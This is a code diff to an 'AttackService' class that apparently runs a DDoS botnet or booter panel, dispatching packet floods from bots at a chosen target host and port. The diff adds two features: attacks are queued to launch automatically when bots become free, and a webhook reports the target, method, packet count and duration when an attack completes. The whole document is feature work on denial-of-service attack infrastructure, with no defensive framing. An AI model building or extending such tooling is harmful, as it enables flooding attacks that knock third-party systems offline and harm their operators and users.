@@ -135,7 +135,22 @@ class AttackService:
                     available = list(r.scalars().all())
 
             if not available:
-                raise HTTPException(503, "No bots available / online")
+                # Queue the attack — will auto-launch when bots free up
+                from app.models.all_models import AttackQueue
+                async with async_session() as s2:
+                    q = AttackQueue(
+                        user_id=user.id,
+                        target_host=data.target_host,
+                        target_port=data.target_port,
+                        method=method,
+                        duration_secs=data.duration_secs,
+                        pps_per_bot=data.pps_per_bot,
+                        bot_count=min(data.bot_count, max_concurrent),
+                        status="queued",
+                    )
+                    s2.add(q)
+                    await s2.commit()
+                raise HTTPException(202, f"No bots available — attack queued (#{q.id})")
 
             bot_ids = [b.id for b in available]
             task = AttackTask(
@@ -218,6 +233,18 @@ class AttackService:
                     await manager.send_stop_command(str(bid), str(task_id))
                 except Exception:
                     pass
+            # Webhook notification
+            try:
+                from app.services.background_service import send_webhook
+                await send_webhook(
+                    "Attack Complete",
+                    f"Target: {task.target_host}:{task.target_port}\n"
+                    f"Method: {task.method}\n"
+                    f"Packets: {task.total_packets:,}\n"
+                    f"Duration: {task.duration_secs}s"
+                )
+            except Exception:
+                pass
 
     @staticmethod
     async def get_user_tasks(user_id: UUID) -> List[AttackTask]:
